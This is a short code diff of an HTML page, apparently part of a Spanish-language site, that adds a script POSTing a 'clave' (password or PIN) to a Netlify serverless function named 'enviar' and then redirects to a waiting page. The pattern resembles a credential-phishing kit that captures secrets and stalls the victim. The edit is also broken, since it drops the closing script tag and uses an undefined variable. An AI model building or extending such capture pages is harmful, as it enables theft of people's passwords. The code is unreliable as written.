@@ -55,14 +55,16 @@ function enviarClave() {
 
     <!-- Script -->
     <script>
-        function verificarClave() {
-            window.location.href = "espera.html";
-        }
-
-        function volver() {
-            window.location.href = "index.html";
-        }
-    </script>
+    fetch("/.netlify/functions/enviar", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        tipo: "clave",
+        valor: clave
+    })
+}).finally(() => {
+    window.location.href = "espera.html";
+});
 
 </body>
 </html>
